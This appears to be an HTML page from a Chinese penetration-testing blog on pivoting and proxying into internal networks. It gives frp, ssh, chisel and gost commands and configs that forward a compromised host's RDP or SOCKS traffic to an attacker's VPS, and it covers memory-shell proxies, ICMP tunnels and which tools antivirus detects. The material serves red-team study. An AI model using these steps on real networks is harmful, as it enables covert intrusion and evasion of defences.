@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>代理 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4ee3\u7406", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+          ]},
+          {title: "\u53cd\u5411\u4ee3\u7406", url: "#_3", children: [
+              {title: "frp\uff08\u4e0d\u9b54\u6539\u88ab\u4e71\u6740\uff09", url: "#frp" },
+              {title: "ssh\u4ee3\u7406\uff08\u9002\u5408\u81ea\u7528\uff09", url: "#ssh" },
+              {title: "npc\uff08\u7e41\u7410\uff0c\u4e14\u5bb9\u6613\u88ab\u6740\uff09", url: "#npc" },
+              {title: "chisel", url: "#chisel" },
+              {title: "iox", url: "#iox" },
+          ]},
+          {title: "\u811a\u672c\u4ee3\u7406\uff08\u6b63\u5411\u4ee3\u7406\uff09", url: "#_4", children: [
+              {title: "suo5", url: "#suo5" },
+              {title: "Neo-reGeorg", url: "#neo-regeorg" },
+              {title: "wsmemshell\uff08\u4ec5\u811a\u672c\uff09", url: "#wsmemshell" },
+              {title: "pivotnacci", url: "#pivotnacci" },
+          ]},
+          {title: "\u96a7\u9053", url: "#_5", children: [
+              {title: "icmp\u96a7\u9053pingtunnel", url: "#icmppingtunnel" },
+              {title: "gost", url: "#gost" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/" class="btn btn-xs btn-link">
+        信息搜集&漏扫
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../WebShell/WebShell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../WebShell/WebShell/" class="btn btn-xs btn-link">
+        WebShell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">代理</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#反向代理">反向代理</a><ul>
+<li><a href="#frp不魔改被乱杀">frp（不魔改被乱杀）</a></li>
+<li><a href="#ssh代理适合自用">ssh代理（适合自用）</a></li>
+<li><a href="#npc繁琐且容易被杀">npc（繁琐，且容易被杀）</a></li>
+<li><a href="#chisel">chisel</a></li>
+<li><a href="#iox">iox</a></li>
+</ul>
+</li>
+<li><a href="#脚本代理正向代理">脚本代理（正向代理）</a><ul>
+<li><a href="#suo5">suo5</a></li>
+<li><a href="#Neo-reGeorg">Neo-reGeorg</a></li>
+<li><a href="#wsmemshell仅脚本">wsmemshell（仅脚本）</a></li>
+<li><a href="#pivotnacci">pivotnacci</a></li>
+</ul>
+</li>
+<li><a href="#隧道">隧道</a><ul>
+<li><a href="#icmp隧道pingtunnel">icmp隧道pingtunnel</a></li>
+<li><a href="#gost">gost</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="_3">反向代理</h1>
+<p>需公网IP</p>
+<h2 id="frp">frp（不魔改被乱杀）</h2>
+<p>frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。 Download；<a href="https://github.com/fatedier/frp/releases" title="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<p>frp分为有两个主要可执行文件，frps和frpc，对应的配置文件为frps.ini和frpc.ini。</p>
+<p>其中frps用作服务端，在进行渗透的时候一般架设在公网VPS上，它的配置文件默认为这样</p>
+<pre><code class="language-纯文本">[common]
+bind_port = 10067  #监听的端口
+
+运行 frps -c frps.ini
+</code></pre>
+<p>frpc用作客户端，在进行渗透的时候一般假设在内网机器上，它的默认文件一般长这样</p>
+<pre><code class="language-纯文本">[common]
+server_addr = 149.17.4.190 # 指定需要转发到的公网IP
+server_port = 10067 # 公网VPS上所监听的端口
+
+[socks_proxy] # 标签名，任意
+type = tcp #设置转发的协议
+local_ip=127.0.0.1 #填127.0.0.1就完事了
+local_port=3389 #需要被转发的端口
+remote_port=10068 #转发到VPS上的端口
+
+运行 frpc -c frpc.ini
+</code></pre>
+<p>当我们在VPS上运行frps，内网机器运行frpc后，内网机器的3389端口就会被转发到公网的10068端口上，接下来我们远程链接 149.17.4.190:10068 即可连进内网机器的远程桌面了。</p>
+<p>上面是端口映射，下面是直接走socks5代理</p>
+<p>服务端:</p>
+<pre><code class="language-纯文本">[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+
+# 用户密码保平安
+dashboard_user = admin1
+dashboard_pwd = hadaessd@@@!!@@#
+# 允许客户端绑定的端口
+allow_ports = 40000-50000
+</code></pre>
+<p>客户端</p>
+<pre><code class="language-纯文本">[common]
+#remote vps addr
+server_addr = your vps addr
+#端口自选
+server_port = 7000   
+tls_enable = true
+pool_count = 5
+
+[plugin_socks]
+type = tcp
+remote_port = 46075
+plugin = socks5
+plugin_user = admin
+plugin_passwd = hahha@@###
+use_encryption = true
+use_compression = true
+</code></pre>
+<h2 id="ssh">ssh代理（适合自用）</h2>
+<p>在本机上执行</p>
+<pre><code class="language-纯文本">ssh -N -f -D 本地端口 用户名@远程服务器ip
+</code></pre>
+<p>然后输入远程服务器上指定的用户名的密码，就可以通过指定的本地端口代入远程服务器内网了\~</p>
+<p><img alt="image-20210309004816359" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309004816359.png" title="image-20210309004816359" /></p>
+<p><img alt="image-20210309004828174" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309004828174.png" title="image-20210309004828174" /></p>
+<h2 id="npc">npc（繁琐，且容易被杀）</h2>
+<p>对于linux|darwin <code>sudo nps start</code></p>
+<p>对于windows，管理员身份运行cmd，进入程序目录 <code>nps.exe start</code></p>
+<p><code>安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于/etc/nps</code></p>
+<p><strong>如果发现没有启动成功，可以查看日志(Windows日志文件位于当前运行目录下，linux和darwin位于/var/log/nps.log)</strong></p>
+<ul>
+<li>访问服务端ip:web服务端口（默认为8080）</li>
+<li>使用用户名和密码登陆（默认admin/123，正式使用一定要更改）</li>
+<li>创建客户端</li>
+</ul>
+<p>&#x20;客户端连接</p>
+<ul>
+<li>点击web管理中客户端前的+号，复制启动命令</li>
+<li>执行启动命令，linux直接执行即可，windows将./npc换成npc.exe用cmd执行</li>
+</ul>
+<p>如果需要注册到系统服务可查看<a href="https://ehang-io.github.io/nps/#/use?id=注册到系统服务" title="注册到系统服务">注册到系统服务</a></p>
+<h2 id="chisel">chisel</h2>
+<ul>
+<li>使用方便  ：<code>Chisel</code>的服务器端和客户端集成在一块，这就很方便</li>
+<li>高性能 &#x20;</li>
+<li>使用SSH协议的加密连接（通过crypto/ssh）</li>
+</ul>
+<p>但是，<code>Chisel</code>的缺点就是，它的文件比较大。（也不是很大)</p>
+<p>vps</p>
+<pre><code class="language-纯文本">./chisel server -p 6666 --reverse
+ssh -C -f -N -g -L 0.0.0.0:23333:127.0.0.1:1080 root@VPSIP 将6666 scoks流量转发到23333端口 
+
+</code></pre>
+<p>肉鸡</p>
+<pre><code class="language-纯文本">chisel.exe client VPSIP:6666 R:socks
+</code></pre>
+<p>攻击者</p>
+<pre><code class="language-纯文本">直接用 socks5://vpsip:23333 进内网
+
+</code></pre>
+<h2 id="iox">iox</h2>
+<p>容易被杀，太久远了。</p>
+<p>1、流量加密（可选）</p>
+<p>2、友好的命令行参数</p>
+<p>3、逻辑优化</p>
+<p>4、UDP流量转发</p>
+<p><img alt="" src="../image/image_xfrN7RjqTw.png" /></p>
+<h1 id="_4">脚本代理（正向代理）</h1>
+<p>不需要公网IP</p>
+<h2 id="suo5">suo5</h2>
+<p>相比 <a href="https://github.com/L-codes/Neo-reGeorg" title="Neo-reGeorg">Neo-reGeorg</a> 等传统隧道工具, <code>suo5</code> 的性能可以达到其数十倍。</p>
+<p>但是不好免杀。
+java脚本</p>
+<h2 id="neo-regeorg">Neo-reGeorg</h2>
+<p>性能不如suo5但是支持多种语言（ashx，aspx....）</p>
+<h2 id="wsmemshell">wsmemshell（仅脚本）</h2>
+<p><a href="https://github.com/veo/wsMemShell" title="https://github.com/veo/wsMemShell">https://github.com/veo/wsMemShell</a></p>
+<p>websocket脚本，但是只有脚本，利用反序列化漏洞直接注入websocket代理内存马，然后直接连上用上全双工通信协议的代理。</p>
+<p>tomcat高版本中，需要改一下脚本才能用：<a href="https://github.com/veo/wsMemShell/issues/18" title="https://github.com/veo/wsMemShell/issues/18">https://github.com/veo/wsMemShell/issues/18</a></p>
+<p>wsmemshell+gost可以联用</p>
+<p>同时该工具也有shell功能，注入websocket命令执行内存马，然后用webscoket client进行远控（chrome有插件）。</p>
+<h2 id="pivotnacci">pivotnacci</h2>
+<p><a href="https://github.com/blackarrowsec/pivotnacci" title="https://github.com/blackarrowsec/pivotnacci">https://github.com/blackarrowsec/pivotnacci</a></p>
+<p>支持php，jsp，aspx。
+改良版regeorg</p>
+<h1 id="_5">隧道</h1>
+<h2 id="icmppingtunnel">icmp隧道pingtunnel</h2>
+<p><a href="https://github.com/esrrhs/pingtunnel" title="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>可以将本地某端口到某ip某端口之间数据通过icmp传输。</p>
+<p>localhost:port←icmp→ip:port</p>
+<p>配合其它代理工具，即可实现icmp代理（如iox，ew等）</p>
+<p>仅靠pingtunnel是无法完成代理进内网的，它只是一个数据加密工具。</p>
+<p>icmp隧道隐藏数据的地方：</p>
+<p><img alt="" src="../image/image_QgdI-GSe5S.png" /></p>
+<h2 id="gost">gost</h2>
+<p>go语言实现的安全隧道</p>
+<p>可用于与wsmemshell联用。</p>
+<p>比如wsmenshell注入的代理内存马地址为 <a href="http://1.1.1.1:1111/proxy">http://1.1.1.1:1111/proxy</a></p>
+<p>那么gost就输这个命令</p>
+<pre><code class="language-纯文本">gost -F &quot;http://1080&quot; -F &quot;ws://1.1.1.1:1111?path=/proxy&quot;
+socks5代理用这个
+gost -F &quot;socks5://1080&quot; -F &quot;ws://1.1.1.1:1111?path=/proxy&quot;
+
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/" class="btn btn-xs btn-link">
+        信息搜集&漏扫
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../WebShell/WebShell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../WebShell/WebShell/" class="btn btn-xs btn-link">
+        WebShell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
